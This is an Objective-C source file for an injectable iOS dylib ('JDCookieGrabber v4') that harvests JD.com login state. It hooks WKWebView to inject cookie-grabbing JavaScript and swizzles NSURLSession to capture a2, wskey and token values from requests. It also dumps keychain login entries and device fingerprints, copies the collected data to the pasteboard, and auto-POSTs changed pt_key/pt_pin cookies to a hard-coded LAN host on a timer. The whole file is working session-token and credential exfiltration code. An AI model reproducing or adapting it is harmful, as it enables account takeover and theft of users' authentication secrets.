// JDCookieGrabber.m v4 — 京东完整登录态采集（TrollFools 注入，无越狱）
// v4: URLSession 请求记录(抓 App 自己的换票调用) + pt_key 变化自动 HTTP 上报电脑
#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#import <Security/Security.h>
#import <objc/runtime.h>

#define HANDLER_NAME @"jdHook"
#define LOG_FILE     @"jd_cookie.log"
#define EXPORT_VER   @"JDCOOKIES_V4"
#define REPORT_URL   @"http://192.168.38.239:17777/jd"

// 全局采集池（声明提前, 供 exportNow 与深挖段共用）
static NSMutableArray *g_kcHits = nil;  // [{svc, acct, len, data}] keychain 命中
static NSMutableArray *g_reqHits = nil; // [{url, k, v}] 请求头/体截获的 a2/wskey
static void dumpToPasteboard(void);     // 定义在文件尾, 定时器/入口调用

#pragma mark - 工具

static BOOL isJDDomain(NSString *d) {
    if (d.length == 0) return NO;
    NSArray *keys = @[@".jd.com", @"jd.com", @".jd.hk", @"jingxi.com", @"360buy.com", @"jdpay.com", @".3.cn", @"yiyaojd.com"];
    for (NSString *k in keys) if ([d containsString:k]) return YES;
    return NO;
}

static NSString *logFilePath(void) {
    NSString *doc = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    return [doc stringByAppendingPathComponent:LOG_FILE];
}

static void appendLog(NSString *line) {
    NSString *p = logFilePath();
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:p];
    NSData *d = [[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding];
    if (!fh) { [d writeToFile:p atomically:YES]; return; }
    [fh seekToEndOfFile];
    [fh writeData:d];
    [fh closeFile];
}

static NSString *cookieStringFromNative(void) {
    NSMutableOrderedSet *parts = [NSMutableOrderedSet orderedSet];
    for (NSHTTPCookie *c in [NSHTTPCookieStorage sharedHTTPCookieStorage].cookies) {
        if (isJDDomain(c.domain)) [parts addObject:[NSString stringWithFormat:@"%@=%@", c.name, c.value]];
    }
    return [parts.array componentsJoinedByString:@"; "];
}

#pragma mark - 共享单例（messageHandler + 导出）

@interface JDShared : NSObject <WKScriptMessageHandler>
@property (strong, nonatomic) NSMutableDictionary *pageCookies; // url -> document.cookie
@property (copy, nonatomic) NSString *appUA;
- (void)exportNow:(UIButton *)btn;
+ (instancetype)shared;
@end

@implementation JDShared

+ (instancetype)shared {
    static JDShared *s;
    static dispatch_once_t once;
    dispatch_once(&once, ^{ s = [[JDShared alloc] init]; s.pageCookies = [NSMutableDictionary dictionary]; });
    return s;
}

// WKWebView 里每个页面定时回传：url / document.cookie / navigator.userAgent
- (void)userContentController:(WKUserContentController *)ucc didReceiveScriptMessage:(WKScriptMessage *)msg {
    if (![msg.name isEqualToString:HANDLER_NAME]) return;
    if (![msg.body isKindOfClass:[NSString class]]) return;
    NSData *d = [(NSString *)msg.body dataUsingEncoding:NSUTF8StringEncoding];
    if (!d) return;
    NSDictionary *o = [NSJSONSerialization JSONObjectWithData:d options:0 error:nil];
    if (![o isKindOfClass:[NSDictionary class]]) return;
    NSString *url = o[@"url"] ?: @"";
    NSString *ck = o[@"ck"] ?: @"";
    NSString *ua = o[@"ua"] ?: @"";
    if (ck.length > 0) self.pageCookies[url] = ck;
    if (ua.length > 0 && self.appUA.length == 0 && ([ua containsString:@"JD4iPhone"] || [ua containsString:@"jdapp"] || [ua containsString:@"JDApp"])) {
        self.appUA = ua;
        appendLog([NSString stringWithFormat:@"[ua] %@", ua]);
    }
}

// 组装导出 JSON：native cookie + WKHTTPCookieStore + JS 页面 cookie + UA
- (void)exportNow:(UIButton *)btn {
    void (^finish)(NSString *) = ^(NSString *cookieStr) {
        NSString *ua = self.appUA ?: @"";
        if (ua.length == 0) ua = [[NSUserDefaults standardUserDefaults] objectForKey:@"UserAgent"] ?: @"";
        NSString *pin = @"";
        for (NSString *p in [cookieStr componentsSeparatedByString:@"; "]) {
            if ([p hasPrefix:@"pt_pin="]) { pin = [p substringFromIndex:7]; break; }
        }
        NSArray *pages = [self.pageCookies keysSortedByValueUsingComparator:^NSComparisonResult(NSString *a, NSString *b) { return (NSComparisonResult)(b.length - a.length); }];
        NSDictionary *out = @{
            @"v"     : EXPORT_VER,
            @"pin"   : pin,
            @"cookie": cookieStr ?: @"",
            @"ua"    : ua,
            @"pages" : [self.pageCookies copy] ?: @{},
            @"kc"    : g_kcHits ?: @[],
            @"req"   : g_reqHits ?: @[],
            @"ts"    : @((long)[NSDate date].timeIntervalSince1970),
        };
        NSData *jd = [NSJSONSerialization dataWithJSONObject:out options:NSJSONWritingWithoutEscapingSlashes error:nil];
        NSString *json = [[NSString alloc] initWithData:jd encoding:NSUTF8StringEncoding];
        [[UIPasteboard generalPasteboard] setString:json];
        appendLog([NSString stringWithFormat:@"[%@] export ver=%@ pin=%@ cookieLen=%lu pages=%lu ua=%@", EXPORT_VER, EXPORT_VER, pin, (unsigned long)cookieStr.length, (unsigned long)pages.count, ua]);
        if (btn) {
            NSString *prev = [btn titleForState:UIControlStateNormal];
            [btn setTitle:@"已复制" forState:UIControlStateNormal];
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                [btn setTitle:prev forState:UIControlStateNormal];
            });
        }
    };

    // 先异步拉一遍 WKHTTPCookieStore（覆盖 WKWebView 层 cookie），1.2s 内合并
    NSMutableArray *pairs = [NSMutableArray array];
    for (NSHTTPCookie *c in [NSHTTPCookieStorage sharedHTTPCookieStorage].cookies)
        if (isJDDomain(c.domain)) [pairs addObject:[NSString stringWithFormat:@"%@=%@", c.name, c.value]];

    WKHTTPCookieStore *store = [WKWebsiteDataStore defaultDataStore].httpCookieStore;
    __block BOOL done = NO;
    [store getAllCookies:^(NSArray<NSHTTPCookie *> *all) {
        for (NSHTTPCookie *c in all) {
            if (isJDDomain(c.domain)) [pairs addObject:[NSString stringWithFormat:@"%@=%@", c.name, c.value]];
        }
        done = YES;
    }];
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        if (!done) appendLog(@"[warn] wkcookiestore timeout");
        NSMutableOrderedSet *set = [NSMutableOrderedSet orderedSetWithArray:pairs];
        // JS 页面 cookie 并入（页面域独立 cookie，如活动专属域）
        for (NSString *url in self.pageCookies) {
            for (NSString *p in [self.pageCookies[url] componentsSeparatedByString:@"; "]) {
                NSString *t = [p stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
                if (t.length > 0 && [t containsString:@"="]) [set addObject:t];
            }
        }
        finish([set.array componentsJoinedByString:@"; "]);
    });
}

@end

#pragma mark - WKWebView 全量注入（swizzle designated initializer）

@implementation WKWebView (JDHook)

+ (void)load {
    Method m1 = class_getInstanceMethod(self, @selector(initWithFrame:configuration:));
    Method m2 = class_getInstanceMethod(self, @selector(jd_initWithFrame:configuration:));
    if (m1 && m2) method_exchangeImplementations(m1, m2);
}

- (instancetype)jd_initWithFrame:(CGRect)frame configuration:(WKWebViewConfiguration *)configuration {
    static NSString *js = nil;
    static NSMapTable *injected = nil; // 防止同一 userContentController 重复注册（重复 addScriptMessageHandler 会抛异常）
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        js = @"(function(){if(window.__JDHOOK__)return;window.__JDHOOK__=1;"
             @"var send=function(o){try{window.webkit.messageHandlers.jdHook.postMessage(JSON.stringify(o));}catch(e){}}"
             @"var grab=function(){send({url:String(location.href||'').substring(0,300),ck:String(document.cookie||'').substring(0,8000),ua:navigator.userAgent});};"
             @"grab();setInterval(grab,15000);})();";
        injected = [NSMapTable weakToStrongObjectsMapTable];
    });
    WKUserContentController *ucc = configuration.userContentController ?: [[WKUserContentController alloc] init];
    if (![injected objectForKey:ucc]) {
        [injected setObject:@YES forKey:ucc];
        WKUserScript *us = [[WKUserScript alloc] initWithSource:js injectionTime:WKUserScriptInjectionTimeAtDocumentStart forMainFrameOnly:NO];
        [ucc addUserScript:us];
        [ucc addScriptMessageHandler:[JDShared shared] name:HANDLER_NAME];
        configuration.userContentController = ucc;
    }
    return [self jd_initWithFrame:frame configuration:configuration];
}

@end

#pragma mark - A2/wskey 深挖: Keychain 全量 + URLSession 请求头

// 只收当前登录号相关 + 设备指纹, 历史账号/无关大块头(AppSign/ullink/微信SDK)全部不要
static BOOL jdKeychainKeyInteresting(NSString *svc, NSString *acct, NSString *dataStr) {
    NSString *s = svc.lowercaseString, *a = acct.lowercaseString, *d = dataStr.lowercaseString;
    if ([s containsString:@"wjlogininfos"]) return [d containsString:@"\"active\":1"]; // 只要当前登录号
    if ([s containsString:@"wjlogin"]) return YES;                                      // 当前登录手机号/GUID
    if ([s containsString:@"360buy.jdmobile"]) {
        if ([a containsString:@"uuidfordevice"] || [a containsString:@"device_id"]) return YES; // 设备指纹
    }
    return NO;
}

// Keychain 全量 dump（GenericPassword + InternetPassword，进程内自己 accessGroup 全通）
static void dumpKeychain(void) {
    if (!g_kcHits) g_kcHits = [NSMutableArray array];
    NSArray *classes = @[(__bridge id)kSecClassGenericPassword, (__bridge id)kSecClassInternetPassword];
    for (id cls in classes) {
        NSDictionary *q = @{
            (id)kSecClass: cls,
            (id)kSecReturnData: @YES,
            (id)kSecReturnAttributes: @YES,
            (id)kSecMatchLimit: (id)kSecMatchLimitAll,
        };
        CFTypeRef res = NULL;
        OSStatus st = SecItemCopyMatching((__bridge CFDictionaryRef)q, &res);
        if (st != errSecSuccess || !res) continue;
        NSArray *items = CFBridgingRelease(res);
        for (NSDictionary *it in items) {
            if (![it isKindOfClass:[NSDictionary class]]) continue;
            NSString *svc = it[(id)kSecAttrService] ?: @"";
            NSString *acct = it[(id)kSecAttrAccount] ?: @"";
            NSData *d = it[(id)kSecValueData] ?: [NSData data];
            if (d.length == 0 || d.length > 262144) continue;
            NSString *raw = [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding] ?: @"";
            if (!jdKeychainKeyInteresting(svc, acct, raw)) continue;
            // 去重: 同 svc+acct 只收一条 (两个 keychain class 会给出重复项)
            BOOL dup = NO;
            for (NSDictionary *h in g_kcHits) if ([h[@"svc"] isEqualToString:svc] && [h[@"acct"] isEqualToString:acct]) { dup = YES; break; }
            if (dup) continue;
            if (g_kcHits.count >= 40) return;
            NSString *b64 = raw.length > 0 ? raw : [d base64EncodedStringWithOptions:0];
            [g_kcHits addObject:@{@"svc": svc, @"acct": acct, @"len": @(d.length), @"data": [b64 substringToIndex:MIN((NSUInteger)8000, b64.length)]}];
            appendLog([NSString stringWithFormat:@"[kc] svc=%@ acct=%@ len=%lu", svc, acct, (unsigned long)d.length]);
        }
    }
}

// URLSession 抓 a2/wskey 路过请求（京东内部 genToken 换票必带）
@implementation NSURLSession (JDHook)

+ (void)load {
    Method m1 = class_getInstanceMethod(self, @selector(dataTaskWithRequest:completionHandler:));
    Method m2 = class_getInstanceMethod(self, @selector(jd_dataTaskWithRequest:completionHandler:));
    if (m1 && m2) method_exchangeImplementations(m1, m2);
}

- (NSURLSessionDataTask *)jd_dataTaskWithRequest:(NSURLRequest *)req completionHandler:(void (^)(NSData *, NSURLResponse *, NSError *))h {
    @try {
        if (!g_reqHits) g_reqHits = [NSMutableArray array];
        if (g_reqHits.count < 30 && req.URL) {
            NSString *url = req.URL.absoluteString ?: @"";
            if ([url.lowercaseString containsString:@"jd"]) {
                NSString *cookieHdr = req.allHTTPHeaderFields[@"Cookie"] ?: @"";
                NSDictionary *hdrs = req.allHTTPHeaderFields;
                for (NSString *k in hdrs) {
                    NSString *lk = k.lowercaseString;
                    if ([lk isEqualToString:@"a2"] || [lk isEqualToString:@"wskey"] || [lk containsString:@"token"] || [lk containsString:@"login"]) {
                        [g_reqHits addObject:@{@"url": [url substringToIndex:MIN((NSUInteger)200, url.length)], @"k": k, @"v": [NSString stringWithFormat:@"%@", hdrs[k]]}];
                    }
                }
                // cookie 头里抠 a2=
                NSRange r = [cookieHdr rangeOfString:@"a2="];
                if (r.location != NSNotFound) {
                    NSString *tail = [cookieHdr substringFromIndex:r.location];
                    NSString *val = [tail componentsSeparatedByString:@";"].firstObject ?: @"";
                    if (val.length > 10) [g_reqHits addObject:@{@"url": [url substringToIndex:MIN((NSUInteger)200, url.length)], @"k": @"a2(cookie)", @"v": val}];
                }
                // body 里抠 a2=/wskey=
                NSData *body = req.HTTPBody;
                if (body.length > 0 && body.length < 131072) {
                    NSString *bs = [[NSString alloc] initWithData:body encoding:NSUTF8StringEncoding] ?: @"";
                    for (NSString *needle in @[@"a2=", @"wskey="]) {
                        NSRange rb = [bs rangeOfString:needle options:NSCaseInsensitiveSearch];
                        if (rb.location != NSNotFound) {
                            NSString *tail = [bs substringFromIndex:rb.location];
                            NSString *val = [[[tail componentsSeparatedByString:@"&"].firstObject componentsSeparatedByString:@";"].firstObject componentsSeparatedByString:@"\n"].firstObject ?: @"";
                            if (val.length > 10) [g_reqHits addObject:@{@"url": [url substringToIndex:MIN((NSUInteger)200, url.length)], @"k": [NSString stringWithFormat:@"%@(body)", needle], @"v": val}];
                        }
                    }
                }
            }
        }
    } @catch (NSException *e) { /* 抓包失败不影响主流程 */ }
    return [self jd_dataTaskWithRequest:req completionHandler:h];
}

@end

#pragma mark - 悬浮球

static UIWindow *g_floatWin = nil;
static UIButton *g_floatBtn = nil;

static void ensureFloatButton(void) {
    if (g_floatWin) return;
    UIWindowScene *scene = nil;
    for (UIScene *s in [UIApplication sharedApplication].connectedScenes) {
        if ([s isKindOfClass:[UIWindowScene class]] && s.activationState == UISceneActivationStateForegroundActive) { scene = (UIWindowScene *)s; break; }
    }
    if (!scene) return;

    CGFloat size = 52;
    UIWindow *w = [[UIWindow alloc] initWithWindowScene:scene];
    w.frame = CGRectMake(10, 240, size, size);
    w.windowLevel = UIWindowLevelAlert + 100;
    w.backgroundColor = [UIColor clearColor];
    w.rootViewController = [UIViewController new];
    w.hidden = NO;

    UIButton *b = [UIButton buttonWithType:UIButtonTypeSystem];
    b.frame = CGRectMake(0, 0, size, size);
    b.layer.cornerRadius = size / 2;
    b.layer.masksToBounds = YES;
    b.backgroundColor = [UIColor colorWithWhite:0.1 alpha:0.55];
    b.layer.borderWidth = 1;
    b.layer.borderColor = [UIColor colorWithWhite:1 alpha:0.35].CGColor;
    [b setTitle:@"JD豆" forState:UIControlStateNormal];
    [b setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    b.titleLabel.font = [UIFont boldSystemFontOfSize:13];

    [b addTarget:[JDShared shared] action:@selector(exportNow:) forControlEvents:UIControlEventTouchUpInside];

    UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc] initWithTarget:[JDShared shared] action:@selector(onPan:)];
    [b addGestureRecognizer:pan];

    [w.rootViewController.view addSubview:b];
    g_floatWin = w;
    g_floatBtn = b;
    appendLog(@"[init] float button ready");
}

@implementation JDShared (Gesture)
- (void)onPan:(UIPanGestureRecognizer *)p {
    CGPoint t = [p translationInView:g_floatWin];
    CGPoint c = g_floatWin.center;
    c.x += t.x; c.y += t.y;
    CGRect scr = [UIScreen mainScreen].bounds;
    c.x = MAX(30, MIN(scr.size.width - 30, c.x));
    c.y = MAX(30, MIN(scr.size.height - 30, c.y));
    g_floatWin.center = c;
    [p setTranslation:CGPointZero inView:g_floatWin];
}
@end

#pragma mark - v4: URLSession 换票调用记录 + pt_key 变化自动上报

static NSString *g_lastPtKey = nil;

// pt_key 变化 → HTTP POST 上报电脑 (电脑端监听 17777)
static void reportIfPtKeyChanged(void) {
    NSString *ck = cookieStringFromNative();
    NSRange r = [ck rangeOfString:@"pt_key=([^;]+)" options:NSRegularExpressionSearch];
    if (r.location == NSNotFound) return;
    NSString *nk = [[ck substringWithRange:r] substringFromIndex:7];
    if (nk.length < 20) return;
    if (g_lastPtKey && [nk isEqualToString:g_lastPtKey]) return;
    BOOL changed = g_lastPtKey != nil && ![nk isEqualToString:g_lastPtKey];
    g_lastPtKey = nk;
    appendLog([NSString stringWithFormat:@"[ptkey] %@ len=%lu%@", [nk substringToIndex:20], (unsigned long)nk.length, changed ? @" CHANGED" : @" first"]);
    if (!changed) return; // 首次只记日志, 变化才上报

    // 组上报 JSON: pin + 全 cookie + ts
    NSString *pin = @"";
    NSRange rp = [ck rangeOfString:@"pt_pin=([^;]+)" options:NSRegularExpressionSearch];
    if (rp.location != NSNotFound) {
        NSString *vp = [ck substringWithRange:rp];
        pin = [vp substringFromIndex:7];
    }
    NSDictionary *out = @{@"v": EXPORT_VER, @"pin": pin, @"cookie": ck, @"ts": @((long)[NSDate date].timeIntervalSince1970)};
    NSData *jd = [NSJSONSerialization dataWithJSONObject:out options:0 error:nil];
    NSMutableURLRequest *rq = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:REPORT_URL]];
    rq.HTTPMethod = @"POST";
    rq.timeoutInterval = 8;
    rq.HTTPBody = jd;
    [rq setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    NSURLSession *ses = [NSURLSession sessionWithConfiguration:[NSURLSessionConfiguration ephemeralSessionConfiguration]];
    [[ses dataTaskWithRequest:rq completionHandler:^(NSData *d, NSURLResponse *resp, NSError *err) {
        NSInteger sc = 0;
        if (resp && [resp isKindOfClass:[NSHTTPURLResponse class]]) sc = ((NSHTTPURLResponse *)resp).statusCode;
        appendLog([NSString stringWithFormat:@"[report] status=%ld err=%@", (long)sc, err.localizedDescription ?: @"none"]);
    }] resume];
}

// URLSession swizzle: 记录 App 自己的换票/登录态调用 (genToken/token/login/autoToken/refresh)
@implementation NSURLSession (JDV4)

+ (void)load {
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        NSArray *sels = @[@"dataTaskWithRequest:completionHandler:", @"dataTaskWithRequest:"];
        for (NSString *sn in sels) {
            SEL orig = NSSelectorFromString(sn);
            SEL hook = NSSelectorFromString([NSString stringWithFormat:@"jd4_%@", sn]);
            Method m1 = class_getInstanceMethod(self, orig);
            Method m2 = class_getInstanceMethod(self, hook);
            if (m1 && m2) method_exchangeImplementations(m1, m2);
        }
    });
}

- (NSURLSessionDataTask *)jd4_dataTaskWithRequest:(NSURLRequest *)req completionHandler:(void (^)(NSData *, NSURLResponse *, NSError *))h {
    @try {
        NSString *url = req.URL.absoluteString ?: @"";
        NSString *body = req.HTTPBody ? [[NSString alloc] initWithData:req.HTTPBody encoding:NSUTF8StringEncoding] ?: @"" : @"";
        BOOL interesting = [url containsString:@"api.m.jd.com"] &&
            ([url containsString:@"genToken"] || [url containsString:@"Token"] || [url containsString:@"login"] ||
             [url containsString:@"autoToken"] || [url containsString:@"refresh"] || body.length > 0);
        if (interesting) {
            NSString *rec = [NSString stringWithFormat:@"[url4] %@\n[body4] %@", [url substringToIndex:MIN((NSUInteger)500, url.length)], [body substringToIndex:MIN((NSUInteger)1200, body.length)]];
            appendLog(rec);
            // 也塞进 g_reqHits 池, 悬浮球导出可见
            if (!g_reqHits) g_reqHits = [NSMutableArray array];
            if (g_reqHits.count < 40) {
                [g_reqHits addObject:@{@"url": [url substringToIndex:MIN((NSUInteger)200, url.length)], @"k": @"url4", @"v": [body substringToIndex:MIN((NSUInteger)600, body.length)]}];
            }
        }
    } @catch (NSException *e) { }
    return [self jd4_dataTaskWithRequest:req completionHandler:h];
}

- (NSURLSessionDataTask *)jd4_dataTaskWithRequest:(NSURLRequest *)req {
    @try {
        NSString *url = req.URL.absoluteString ?: @"";
        if ([url containsString:@"api.m.jd.com"] &&
            ([url containsString:@"genToken"] || [url containsString:@"Token"] || [url containsString:@"login"])) {
            appendLog([NSString stringWithFormat:@"[url4-nocb] %@", [url substringToIndex:MIN((NSUInteger)400, url.length)]]);
        }
    } @catch (NSException *e) { }
    return [self jd4_dataTaskWithRequest:req];
}

@end

#pragma mark - 定时导出（无按钮路径）

static void dumpToPasteboard(void) {
    @try {
        dumpKeychain();
        [[JDShared shared] exportNow:nil];
    } @catch (NSException *e) {
        appendLog([NSString stringWithFormat:@"[err] dump: %@", e]);
    }
}

#pragma mark - 入口

__attribute__((constructor))
static void JDCookieGrabberInit(void) {
    appendLog(@"[init] loaded");
    // 等 scene 就绪后再挂悬浮球（重试几次）
    for (int i = 0; i < 20; i++) {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)((2 + i * 3) * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            if (!g_floatWin) ensureFloatButton();
        });
    }
    // 启动后扫 keychain（a2/wskey 窝点）+ 定时刷剪贴板 + pt_key 变化上报
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(8 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        dumpKeychain();
        reportIfPtKeyChanged();
        dumpToPasteboard();
    });
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(30 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        dumpKeychain();
    });
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(120 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        dumpKeychain();
        reportIfPtKeyChanged();
        dumpToPasteboard();
    });
    dispatch_source_t timer = dispatch_source_create(DISPATCH_SOURCE_TYPE_TIMER, 0, 0, dispatch_get_main_queue());
    dispatch_source_set_timer(timer, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(300 * NSEC_PER_SEC)), 300 * NSEC_PER_SEC, 10 * NSEC_PER_SEC);
    dispatch_source_set_event_handler(timer, ^{
        dumpKeychain();
        reportIfPtKeyChanged();
        dumpToPasteboard();
    });
    dispatch_resume(timer);
}
